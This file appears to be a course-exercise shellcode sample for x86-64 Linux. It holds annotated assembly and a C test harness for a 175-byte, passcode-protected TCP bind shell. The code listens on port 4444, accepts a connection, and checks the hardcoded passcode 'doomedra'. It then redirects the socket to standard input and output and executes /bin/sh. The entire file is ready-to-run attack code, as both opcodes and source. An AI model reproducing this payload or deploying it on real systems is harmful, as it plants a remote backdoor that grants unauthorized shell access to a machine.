/*
;Author - Andriy Brukhovetskyy - doomedraven - SLAEx64 - 1322
;175 bytes
;http://www.doomedraven.com/2014/05/slaex64-shellbindtcp-with-passcode.html

global _start
section .text
_start:
    push byte 0x29 ; 41 - socket syscall
    pop rax
    push byte 0x02 ; AF_INET
    pop rdi
    push byte 0x01 ; SOCK_STREAM
    pop rsi
    cdq
    syscall

    ;copy socket descriptor to rdi for future use
    ;bind
    xchg rdi, rax
    xor rax, rax
    mov dword [rsp-4], eax    ;INADDR_ANY
    mov word  [rsp-6], 0x5c11 ;PORT 4444
    mov byte  [rsp-8], 0x2    ;AF_INET
    sub rsp, 0x8

    push byte 0x31 ;49 bind
    pop rax
    mov rsi, rsp
    cdq
    add dl, 16 ;len
    syscall

    ;listen
    push byte 0x32 ;listen
    pop rax
    ;push byte 0x02 ;max clients
    ;pop rsi
    syscall

    push byte 0x2b ; accept
    pop rax
    sub rsp, 0x10  ; adjust
    xor rsi, rsi
    mov rsi, rsp ; pointer
    mov byte [rsp-1], 0x10 ;len
    sub rsp, 0x01   ; adjust
    cdq
    mov rdx, rsp ; pointer
    syscall

    ;read buffer
    mov rdi, rax ; socket
    xor rax, rax
    mov byte [rsp-1], al ;0 read
    sub rsp, 1
    cdq
    push rdx ; 0 stdin
    lea rsi, [rsp-0x10] ; 16 bytes from buffer
    add dl, 0x10        ; len
    syscall

    ;test passcode
    mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
    push rdi                    ; save the socket
    lea rdi, [rsi]              ; load string from address
    scasq                       ; compare
    jz accepted_passwd          ; jump if equal

    ;exit if different :P
    xor rax, rax
    add al, 60
    syscall

accepted_passwd:

    pop rdi; socket
    push byte 0x03
    pop rsi

dup2_loop:
    dec rsi
    push byte 0x21
    pop rax
    syscall
    jnz dup2_loop ; jump if not 0

    push rsi; 0

    ;execve
    ;push /bin//sh in reverse
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    push rsi

    mov rdx, rsp
    push rdi

    mov rsi, rsp
    push byte 0x3b
    pop rax
    syscall

*/

#include <stdio.h>
#include <string.h>

// 175 bytes
unsigned char code[] =\
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
"\x48\x97\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44"
"\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec"
"\x08\x6a\x31\x58\x48\x89\xe6\x99\x80\xc2\x10\x0f"
"\x05\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x48\x83\xec"
"\x10\x48\x31\xf6\x48\x89\xe6\xc6\x44\x24\xff\x10"
"\x48\x83\xec\x01\x99\x48\x89\xe2\x0f\x05\x48\x89"
"\xc7\x48\x31\xc0\x88\x44\x24\xff\x48\x83\xec\x01"
"\x99\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f\x05"
"\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57\x48"
"\x8d\x3e\x48\xaf\x74\x07\x48\x31\xc0\x04\x3c\x0f"
"\x05\x5f\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f"
"\x05\x75\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
"\x73\x68\x53\x48\x89\xe7\x56\x48\x89\xe2\x57\x48"
"\x89\xe6\x6a\x3b\x58\x0f\x05";

main()
{
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}